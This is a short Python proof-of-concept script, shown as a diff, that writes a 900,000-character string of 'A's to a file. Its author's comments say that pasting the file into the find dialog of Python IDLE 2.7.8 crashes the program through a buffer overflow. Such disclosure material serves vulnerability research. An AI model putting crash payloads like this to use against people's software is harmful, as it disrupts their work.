@@ -1,0 +1,21 @@
+#!/usr/bin/env python
+# Title : Python IDLE 2.7.8  - Crash Proof Of Concept
+# Website : http://www.python.org/idle/
+# Tested : Windows 7 / Windows 8.1
+#
+#
+# Author      :   Hadi Zomorodi Monavar
+# Email       :   zomorodihadi@gmail.com
+#
+# 1 . run python code : python poc.py
+# 2 . open r3z4.txt and copy content to clipboard
+# 3 . open "python 2.7.8 IDLE"
+# 4 . from Menu (edit --> find)
+# 5 . Paste ClipBoard on "find"
+# 6 . Enter
+# 7 . Crashed ;)
+
+crash = "\x41"*900000 #B0F
+file = open("r3z4.txt", "w")
+file.write(crash)
+file.close()
